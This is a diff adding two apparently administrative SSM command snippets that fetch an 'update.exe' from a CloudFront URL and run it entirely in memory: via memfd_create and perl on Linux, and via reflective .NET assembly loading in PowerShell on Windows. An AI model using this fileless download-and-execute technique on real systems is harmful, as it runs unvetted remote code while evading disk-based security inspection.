@@ -1,0 +1,19 @@
+# Linux SSM command
+# Download and execute without touching the disk
+curl -fsSL https://your-distro.cloudfront.net/updates/update.exe | perl -e '
+    $name = "in_memory_update";
+    $fd = syscall(319, $name, 1); # 319 is memfd_create
+    open($fh, ">&=$fd");
+    print $fh <STDIN>;
+    exec {"/proc/self/fd/$fd"} $name;
+'
+
+# Windows SSM command
+# 1. Download the bytes directly into a variable (not a file)
+$bytes = (New-Object System.Net.WebClient).DownloadData("https://your-distro.cloudfront.net/updates/update.exe")
+
+# 2. Load the bytes as an Assembly (Works if update.exe is a .NET binary)
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+# 3. Execute the 'Main' method
+$assembly.EntryPoint.Invoke($null, $null)
